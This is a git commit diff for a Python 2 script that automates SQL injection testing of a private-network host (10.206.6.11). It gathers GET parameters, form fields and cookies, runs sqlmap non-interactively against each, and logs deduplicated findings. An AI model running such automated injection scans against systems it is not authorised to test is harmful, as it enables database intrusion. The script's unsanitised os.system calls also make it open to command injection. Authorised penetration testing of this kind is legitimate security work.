e69860c4d29054e3bb1ba4c821c65c5467035bde
root <root@localhost.localdomain>
2015-09-09 12:24:58 +0800

    sql injection test

--- fuck_sqlinjection-xss.py
+++ fuck_sqlinjection-xss.py
@@ -4,13 +4,52 @@ import urllib2
 import urllib
 import os
 import sys
-import thread
+import time
 import re
 import cookielib
 
 
 # 目标站点域名
 host = "10.206.6.11"
+
+# 爬到的页面url
+target = {'http://10.206.6.11/new.php?id=2':[],
+          'http://10.206.6.11/book.php':[r'''<form name="from1" id="from1" method="post" action="book.php?action=add">
+			<table border="0" cellspacing="0" cellpadding="0" id="fortab">
+			<tr>
+			<td>标题*：</td>
+			<td><input name="title" type="text"/></td>
+			</tr>
+			<tr>
+			<td>姓名*：</td>
+			<td><input name="name" type="text" /></td>
+			</tr>
+			<tr>
+			<td>Email*：</td>
+			<td><input name="email" type="text" /></td>
+			</tr>
+			<tr>
+			<td>浏览权限：</td>
+			<td><select name="select">
+    			<option value="all">所有人</option>
+    			<option value="mst">管理员</option>
+				</select>
+			</td>
+			
+			<tr>
+			<td>验证码*：</td>
+			<td><input name="capt" type="text" size="5" maxlength="4" />
+			<img id='rand' src='captcha.php'></img><a href='javascript:chk()'>看不清楚</a></td>
+			</tr>
+			
+			</tr>
+			<tr>
+			<td>内容*：</td>
+			<td><textarea name="ms" rows="10"/></textarea></td>
+			</tr>
+			</table>
+			<input type="submit" name="submit" value="提交" class="submails" />
+			</form>''',]}
 
 # dict转化成list
 def dict_to_list(d, middle):
@@ -33,7 +72,7 @@ def get_newurl(url, start, hashs, paramscp, param, value, fuzz):
     return newurl
 '''
 
-# 生成测试结果文件
+# 生成sql注入测试结果文件
 def outputfile(url):
     global host
         
@@ -52,14 +91,23 @@ def outputfile(url):
             pass
         else:
             result = "%s\n" % url
-            result += re.search(r'---(.|\n)+---', content)
+            result += (re.search(r'---(.|\n)+---', str(content))).group(0)
             result += "\n\n"
             
-            filepath = "%s/result.txt" % host
+            filepath = "%s/result_sqlinjection.txt" % host
             
-            output = open(filepath, 'a')
-            output.write(result)
-            output.close()
+            output = open(filepath, 'r')
+            
+            # 若与已得到的结果不重复则写入
+            out = output.read()
+            if result in out:
+                output.close()
+            else:
+                output.close()
+                
+                output = open(filepath, 'a')
+                output.write(result)
+                output.close()
     
     return 0
 
@@ -67,21 +115,21 @@ def outputfile(url):
 # 使用sqlmap进行GET注入测试
 def sqlmap_get(url, param):
     
-    os.system("sqlmap -u %s -p %s" % (url, str(param)))
+    os.system("sqlmap -u %s -p %s --batch" % (url, str(param)))
     
     return 0
 
 # 使用sqlmap进行POST注入测试
 def sqlmap_post(url):
     
-    os.system("sqlmap -u %s --forms" % url)
+    os.system("sqlmap -u %s --forms --batch" % url)
     
     return 0
 
 # 使用sqlmap进行COOKIES注入测试
 def sqlmap_cookies(url, cookies):
     
-    os.system("sqlmap -u %s --cookies=%s" % (url, cookies))
+    os.system("sqlmap -u %s --cookie=%s --batch" % (url, cookies))
     
     return 0
 
@@ -96,11 +144,11 @@ def fuck_get_sqlinjection(target):
         keys = ''
         hashs = ''
         
-        start = url.index('?')
+        start = url.find('?')
         if start < 0:
             continue
         else:
-            end = url.index('#')
+            end = url.find('#')
             
             if end > 0:
                 keys = url[start+1:end]
@@ -112,7 +160,7 @@ def fuck_get_sqlinjection(target):
             map(lambda x:params.setdefault(x.split('=')[0], x.split('=')[1]), keys)
             
     
-        # 通过改变参数的值进行sql注入测试     
+        # 依次对各参数进行GET注入测试     
         for param in params:
             
             try:
@@ -139,36 +187,88 @@ def fuck_post_sqlinjection(target):
                 
 
 # 检测是否存在COOKIES类型的注入
-def fuck_cookies_sqlinjection(host):
+def fuck_cookies_sqlinjection(target):
     
-    
-    # 获取页面cookies
-    cj = cookielib.CookieJar()
-    
-    opener = urllib2.build_opener(urllib2.HTTPCookieProcessor(cj))
-    
-    opener.add_handler = [('User-agent','Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)')]
-    
-    cookies = []
-    coo = ''
-    
-    for index,cookie in enumerate(cj):
-        coo = re.search(r" (.+) for ", str(cookie))
-        coo = coo.group(1)
-        cookies.append(coo)
-    
-    cookies = ';'.join(cookies)
-    
-    
-    # 测试sql注入
-    try:
-        sqlmap_cookies(host, cookies)
-    except KeyboardInterrupt:
-        pass
-    finally:
-        outputfile(host)
+    for url in target:
+        start = url.find('?')
         
+        if start < 0:
+            continue
+        else:
             
+            # 获取页面cookies
+            cj = cookielib.CookieJar()
+    
+            opener = urllib2.build_opener(urllib2.HTTPCookieProcessor(cj))
+    
+            opener.add_handler = [('User-agent','Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)')]
+    
+            opener.open(url)
+    
+            cookies = []
+            coo = ''
+    
+            for index,cookie in enumerate(cj):
+                coo = re.search(r" (.+) for ", str(cookie))
+                coo = coo.group(1)
+                cookies.append(coo)
+                
+            cookies = ';'.join(cookies)
             
+            cj.clear()
             
+            # 如果没有获取页面cookies则跳过
+            if cookies == '':
+                continue
             
+    
+            # 测试cookies注入
+            try:
+                sqlmap_cookies(url, cookies)
+            except:
+                pass
+            finally:
+                outputfile(url)
+
+
+# 主函数
+def main():
+    
+    global host
+    global target
+    
+    path = "%s" % host
+    
+    # 判断该网站是否经过sql注入测试
+    
+    
+    # 判断该网站是否经过xss测试
+    
+    
+    # 创建测试结果目录及文件
+    if os.path.isdir(path) is False:
+        os.system("mkdir %s" % path)
+    
+    if os.path.isfile("%s/result_sqlinjection.txt" % path) is False:
+        os.system("touch %s/result_sqlinjection.txt" % path)
+    
+    # 进行sql注入测试
+    
+    fuck_cookies_sqlinjection(target)
+    print '--------------------cookies over---------------------'
+            
+    time.sleep(5)    
+       
+    fuck_get_sqlinjection(target)
+    print '----------------------get over-----------------------'
+        
+    time.sleep(5)
+    fuck_post_sqlinjection(target)
+    print '----------------------post over----------------------'
+        
+    time.sleep(5)
+      
+    return 0
+
+if __name__ == '__main__':
+    main()
